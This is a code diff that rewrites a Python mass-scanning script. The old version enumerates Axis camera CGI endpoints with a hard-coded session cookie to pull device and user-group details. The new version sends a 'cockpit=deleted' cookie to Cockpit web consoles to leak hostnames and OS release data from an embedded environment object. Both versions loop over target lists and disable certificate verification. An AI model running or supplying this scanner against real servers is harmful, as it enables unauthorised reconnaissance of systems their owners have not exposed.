@@ -1,120 +1,103 @@
 import requests
 import argparse
 import json
+import re
 from urllib.parse import urlparse
-import urllib3
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-def spr(url, endpoint, payload):
-    parsed_url = urlparse(url)
-    host = parsed_url.hostname
-    port = parsed_url.port
-    scheme = parsed_url.scheme
-    
-    headers = {
-        "Host": f"{host}:{port}" if port else host,
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
-        "Content-Type": "application/json",
-        "Accept": "*/*",
-        "Connection": "keep-alive"
-    }
-    
-    full_url = f"{url}{endpoint}"
-    response = requests.post(full_url, headers=headers, json=payload, verify=False)
-    
+def ed(response_text):
     try:
-        return response.json()
-    except json.JSONDecodeError:
-        return None
+        match = re.search(r"var environment = ({.*?});", response_text, re.DOTALL)
 
-def sgr(url, endpoint, cookies=None):
-    parsed_url = urlparse(url)
-    host = parsed_url.hostname
-    port = parsed_url.port
-    
+        if match:
+            data = match.group(1)
+            
+            environment_data = json.loads(data)
+            
+            require_host = environment_data.get("page", {}).get("require_host", None)
+            hostname = environment_data.get("hostname", None)
+            os_release = environment_data.get("os-release", None)
+
+            print(f"[+] Require Host: {require_host}")
+            print(f"[+] Hostname: {hostname}")
+
+            if os_release:
+                print(f"[+] Sysinfo:")
+                for key, value in os_release.items():
+                    print(f"  {key}: {value}")
+            else:
+                print("[!] Sysinfo: Not available")
+        else:
+            print("[!] Couldn't find 'var environment' in the response text.")
+    except json.JSONDecodeError as e:
+        print(f"[!] Error decoding JSON: {e}")
+    except Exception as e:
+        print("[!] Error while extracting data:", e)
+
+def sr(url, host):
     headers = {
-        "Host": f"{host}:{port}" if port else host,
+        "Host": host,
+        "Cookie": "cockpit=deleted",
+        "Sec-Ch-Ua-Platform": "\"Windows\"",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
+        "Sec-Ch-Ua": "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Brave\";v=\"134\"",
+        "Sec-Ch-Ua-Mobile": "?0",
         "Accept": "*/*",
+        "Sec-Gpc": "1",
+        "Accept-Language": "fr-FR,fr;q=0.5",
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Dest": "empty",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Priority": "u=1, i",
         "Connection": "keep-alive"
     }
-    
-    if cookies:
-        headers["Cookie"] = cookies
-    
-    full_url = f"{url}{endpoint}"
-    response = requests.get(full_url, headers=headers, verify=False)
-    
-    return response.text
 
-def dsr(response_json):
-    if response_json and "data" in response_json:
-        data = response_json["data"]
-        print("[+] System Ready:", "OK" if data.get("systemready") == "yes" else "NOT READY")
-        print(" -  Uptime:", data.get("uptime", "N/A"))
-        print(" -  Boot ID:", data.get("bootid", "N/A"))
+    try:
+        response = requests.get(url, headers=headers, verify=False)
+        print("[+] STATUS:", response.status_code)
 
-def dbdi(response_json):
-    if response_json and "data" in response_json and "propertyList" in response_json["data"]:
-        prop_list = response_json["data"]["propertyList"]
-        print("[+] Device Information:")
-        print(" -  Product Number:", prop_list.get("ProdNbr", "N/A"))
-        print(" -  Hardware ID:", prop_list.get("HardwareID", "N/A"))
-        print(" -  Full Name:", prop_list.get("ProdFullName", "N/A"))
-        print(" -  Version:", prop_list.get("Version", "N/A"))
-        print(" -  Type:", prop_list.get("ProdType", "N/A"))
-        print(" -  Brand:", prop_list.get("Brand", "N/A"))
-        print(" -  Serial Number:", prop_list.get("SerialNumber", "N/A"))
-        print(" -  Build Date:", prop_list.get("BuildDate", "N/A"))
+        ed(response.text)
 
-def dl(response_text):
-    if "OK" in response_text:
-        print("[+] Login Successful")
+    except requests.RequestException as e:
+        print("[!] Request failed:", e)
 
-def du(response_text):
-    print("[+] User Groups:")
-    for group in ["anonymous", "viewer"]:
-        if group in response_text:
-            print("    -", group)
-
-def ps(url):
-    print(f"\n[+] SERVER: {url}")
-    print("="*40)
-    
-    systemready_payload = {"apiVersion": "1.0", "method": "systemready", "params": {"timeout": 10}}
-    systemready_response = spr(url, "/axis-cgi/systemready.cgi", systemready_payload)
-    dsr(systemready_response)
-    print("="*40)
-    
-    basicdeviceinfo_payload = {"apiVersion": "1.3", "method": "getAllUnrestrictedProperties"}
-    basicdeviceinfo_response = spr(url, "/axis-cgi/basicdeviceinfo.cgi", basicdeviceinfo_payload)
-    dbdi(basicdeviceinfo_response)
-    print("="*40)
-    
-    login_response_text = sgr(url, "/axis-cgi/login.cgi")
-    dl(login_response_text)
-    print("="*40)
-    
-    usergroup_response_text = sgr(url, "/axis-cgi/usergroup.cgi", cookies="_axis=g68MI7PkpY")
-    du(usergroup_response_text)
-    print("="*40)
+def puf(file_path):
+    try:
+        with open(file_path, "r") as file:
+            urls = file.readlines()
+            
+        for url in urls:
+            url = url.strip()
+            if url:
+                print(f"\n[+] Scan => {url}")
+                parsed_url = urlparse(url)
+                if not parsed_url.scheme:
+                    print("[!] Invalid URL format. Make sure it starts with http:// or https://")
+                else:
+                    host = parsed_url.netloc
+                    sr(url, host)
+    except FileNotFoundError:
+        print(f"[!] File '{file_path}' not found.")
+    except Exception as e:
+        print(f"[!] Error reading file '{file_path}': {e}")
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Envoie des requêtes HTTP et affiche les réponses.")
-    parser.add_argument("-u", "--url", help="URL au format http://IP:PORT ou https://IP:PORT")
-    parser.add_argument("-l", "--list", help="Fichier texte contenant la liste des serveurs")
-    
+    parser = argparse.ArgumentParser(description="Send HTTP GET request to a specified URL or from a list of URLs in a file")
+    parser.add_argument("-u", "--url", type=str, help="Target URL in the format http://IP:PORT")
+    parser.add_argument("-l", "--list", type=str, help="File containing a list of URLs to test (one per line)")
+
     args = parser.parse_args()
 
     if args.url:
-        ps(args.url)
+        parsed_url = urlparse(args.url)
+        if not parsed_url.scheme:
+            print("[!] Invalid URL format. Make sure it starts with http:// or https://")
+        else:
+            host = parsed_url.netloc
+            sr(args.url, host)
     
-    if args.list:
-        with open(args.list, "r") as file:
-            servers = file.readlines()
-        
-        for server in servers:
-            server = server.strip()
-            if server: 
-                ps(server)
+    elif args.list:
+        puf(args.list)
+    
+    else:
+        print("[!] Please provide either a single URL with -u or a file with -l.")
